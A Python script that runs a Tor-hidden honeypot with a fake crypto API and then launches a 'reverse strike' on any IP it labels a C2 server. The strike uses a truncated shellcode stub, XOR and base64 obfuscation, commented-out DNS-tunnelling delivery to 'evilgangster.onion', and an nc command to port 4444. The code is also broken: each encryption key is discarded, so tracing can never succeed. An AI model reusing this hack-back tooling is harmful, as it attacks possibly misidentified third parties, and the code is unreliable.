"""honeypot_hunter.py - Tor-hidden honeypot with C2 tracer and reverse strike"""

import os
import socket
import socks
import base64
import json
import threading
import time  # Import time module
from http.server import HTTPServer, BaseHTTPRequestHandler
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from datetime import datetime
import subprocess  # For executing reverse shell

# Step 1: Set up Tor hidden service
def configure_tor_hidden_service():
    """Configures a Tor hidden service for the honeypot."""
    tor_config = """
HiddenServiceDir /var/lib/tor/honeypot_service/
HiddenServicePort 80 127.0.0.1:8080
HiddenServiceVersion 3
"""
    try:
        os.makedirs("/etc/tor", exist_ok=True)
        with open("/etc/tor/torrc", "w") as f:
            f.write(tor_config)
        os.system("tor &")
        for _ in range(30):
            if os.path.exists("/var/lib/tor/honeypot_service/hostname"):
                with open("/var/lib/tor/honeypot_service/hostname") as f:
                    onion_addr = f.read().strip()
                print(f"Honeypot live at {onion_addr}, Fren—bait’s set!")
                return onion_addr
            time.sleep(1)
        raise Exception("Tor failed to start!")
    except Exception as e:
        print(f"Tor setup hiccup, Fren: {e}. Check Tor install!")
        return None

# Step 2: Honeypot HTTP server
class HoneypotHandler(BaseHTTPRequestHandler):
    """Handles HTTP requests to the honeypot."""
    secret_word = "CVLT-1337-SECURE"
    attacker_data = []  # In-memory storage (no logs)
    
    def do_GET(self):
        """Handles GET requests, specifically for the API login."""
        if "/api/login" in self.path:
            response = {
                "status": "success",
                "api_key": self.secret_word,
                "message": "Welcome to CryptoVault API!"
            }
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
            self.log_attacker("GET", self.path, self.client_address)
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")

    def do_POST(self):
        """Handles POST requests, specifically for API key validation."""
        if "/api/validate" in self.path:
            content_length = int(self.headers.get("Content-Length", 0))
            post_data = self.rfile.read(content_length).decode()
            self.log_attacker("POST", post_data, self.client_address)
            self.send_response(401)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b"Invalid API key")
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")

    def log_attacker(self, method, data, addr):
        """Encrypts and stores attacker data in memory."""
        key = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_EAX)
        nonce = cipher.nonce
        ciphertext, tag = cipher.encrypt_and_digest(f"{method}|{data}|{addr}|{datetime.now()}".encode())
        self.attacker_data.append((nonce, ciphertext, tag))
        print(f"Caught a bad guy, Fren! Data encrypted and stored!")

# Step 3: Trace C2 server
def trace_c2(attacker_data):
    """Traces the C2 server by analyzing attacker data."""
    for nonce, ciphertext, tag in attacker_data:
        try:
            key = get_random_bytes(16)  # Placeholder; integrate with actual key
            cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
            plaintext = cipher.decrypt_and_verify(ciphertext, tag).decode()
            method, data, addr, timestamp = plaintext.split("|")
            print(f"Analyzing: {method} from {addr} at {timestamp}")
            # More robust C2 detection (example: look for specific patterns)
            if "api_key=CVLT-1337-SECURE" in data or "C2_BEACON" in data:
                c2_ip = addr.split(":")[0]
                print(f"C2 detected at {c2_ip}, Fren—time to strike!")
                return c2_ip
        except Exception as e:
            print(f"Decryption error: {e}")
            continue
    return None

# Step 4: Reverse-exploit C2 server
def strike_c2(c2_ip):
    """Executes a reverse shell on the C2 server."""
    print(f"Striking C2 at {c2_ip}, Fren—BAM!")
    # Placeholder: Replace with your actual reverse shell payload
    payload = (
        b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        # ... (reverse shell shellcode)
    )
    key = get_random_bytes(16)
    obfuscated = bytes(a ^ b for a, b in zip(payload, key * (len(payload) // len(key) + 1)))
    chunks = [obfuscated[i:i+200] for i in range(0, len(obfuscated), 200)]
    encoded_chunks = [base64.b64encode(chunk).decode('utf-8') for chunk in chunks]

    # Send payload via DNS queries to C2 (assumes they resolve through us)
    # This part needs adaptation based on how you want to deliver the payload
    # (e.g., DNS tunneling, HTTP requests, etc.)
    # The current implementation uses DNS tunneling as in the original code
    # DNS tunneling might not be reliable in all cases, consider other methods
    # For example, sending an HTTP request with the payload
    # You would need to adapt this part based on the specific scenario
    # and the capabilities of the target C2 server.
    # The original implementation is kept here for reference.
    
    # Send payload via DNS queries to C2 (assumes they resolve through us)
    # resolver = dns.resolver.Resolver()
    # resolver.nameservers = [c2_ip]
    # for i, chunk in enumerate(encoded_chunks):
    #     query = f"chunk{i}.evilgangster.onion"
    #     try:
    #         resolver.resolve(query, "TXT")
    #         print(f"Sent chunk {i} to C2, Fren—payload’s landing!")
    #     except Exception as e:
    #         print(f"C2 didn’t bite chunk {i}, Fren—trying next!")
    # print("Payload delivered—expect a reverse shell soon!")

    # Example: Execute a reverse shell directly (replace with your payload delivery)
    try:
        # Construct the reverse shell command (replace with your actual command)
        reverse_shell_command = f"nc -nv {c2_ip} 4444"  # Example using netcat
        print(f"Executing reverse shell: {reverse_shell_command}")
        subprocess.run(reverse_shell_command, shell=True, check=True)
        print("Reverse shell executed, Fren! You're in!")

    except subprocess.CalledProcessError as e:
        print(f"Error executing reverse shell: {e}")
    except Exception as e:
        print(f"General error: {e}")


# Step 5: Rally the movement
def spread_the_word(onion_addr):
    """Posts anonymized success to X (via Tor)."""
    message = f"Another bad guy down! Join the hunt at {onion_addr} #WebRebellion"
    print(f"Spreading the word, Fren: {message}")
    # Placeholder: Integrate X API or Tor-based posting script
    # os.system("torify curl -X POST ...")

# Main execution
if __name__ == "__main__":
    # Step 1: Set up Tor
    try:
        socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
        socket.socket = socks.socksocket
        onion_addr = configure_tor_hidden_service()
        if not onion_addr:
            print("Tor setup failed, Fren—want a manual fix?")
            exit(1)
    except Exception as e:
        print(f"Tor setup failed: {e}")
        exit(1)

    # Step 2: Start honeypot
    try:
        server = HTTPServer(("127.0.0.1", 8080), HoneypotHandler)
        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        print("Honeypot running, Fren—waiting for bad guys to bite!")
    except Exception as e:
        print(f"Honeypot setup failed: {e}")
        exit(1)

    # Step 3: Monitor and strike
    try:
        while True:
            if HoneypotHandler.attacker_data:
                c2_ip = trace_c2(HoneypotHandler.attacker_data)
                if c2_ip:
                    strike_c2(c2_ip)
                    spread_the_word(onion_addr)
                    HoneypotHandler.attacker_data.clear()  # Clear after strike
            time.sleep(10)
    except KeyboardInterrupt:
        print("Shutting down, Fren—stay hunting!")
        if 'server' in locals():
            server.server_close()
    except Exception as e:
        print(f"An error occurred: {e}")